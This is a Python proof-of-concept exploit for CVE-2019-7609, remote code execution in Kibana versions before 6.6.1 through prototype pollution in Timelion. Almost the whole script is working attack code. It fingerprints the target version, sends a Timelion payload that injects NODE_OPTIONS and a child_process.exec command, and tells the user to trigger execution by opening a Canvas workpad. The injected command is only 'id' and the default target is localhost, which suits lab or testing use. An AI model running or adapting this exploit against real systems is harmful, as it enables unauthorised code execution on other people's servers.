#!/usr/bin/env python3
"""
Kibana Timelion RCE (CVE-2019-7609) PoC
Prototype pollution to RCE in Kibana < 6.6.1
"""
import sys
import urllib.request
import json

def exploit(target_url: str):
    print(f"[*] Target: {target_url}")
    print(f"[*] CVE-2019-7609 - Kibana Timelion RCE")
    print()

    print("[*] Checking Kibana status...")
    try:
        req = urllib.request.Request(f"{target_url}/api/status", method='GET')
        req.add_header('kbn-xsrf', 'true')
        resp = urllib.request.urlopen(req, timeout=10)
        body = json.loads(resp.read())
        version = body.get('version', {}).get('number', 'unknown')
        print(f"[+] Kibana version: {version}")
    except Exception as e:
        print(f"[-] Cannot reach Kibana status: {e}")
        return

    timelion_payload = '.es(*).props(label.__proto__.env.AAAA=\'require("child_process").exec("id");//\').props(label.__proto__.env.NODE_OPTIONS=\'--require /proc/self/environ\')'

    print("[*] Sending Timelion prototype pollution payload...")
    data = json.dumps({
        "sheet": [timelion_payload],
        "time": {
            "from": "now-15m",
            "to": "now",
            "mode": "quick",
            "interval": "auto",
        }
    }).encode()

    try:
        req = urllib.request.Request(
            f"{target_url}/api/timelion/run",
            data=data, method='POST'
        )
        req.add_header('Content-Type', 'application/json')
        req.add_header('kbn-xsrf', 'true')
        resp = urllib.request.urlopen(req, timeout=15)
        body = resp.read().decode('utf-8', errors='replace')
        print(f"[+] Timelion response: {body[:1000]}")
        print()
        print("[*] Prototype pollution payload injected.")
        print("[*] Trigger RCE by visiting any Canvas workpad in Kibana.")
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', errors='replace')
        print(f"[-] HTTP {e.code}: {body[:500]}")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == '__main__':
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:9043"
    exploit(url)
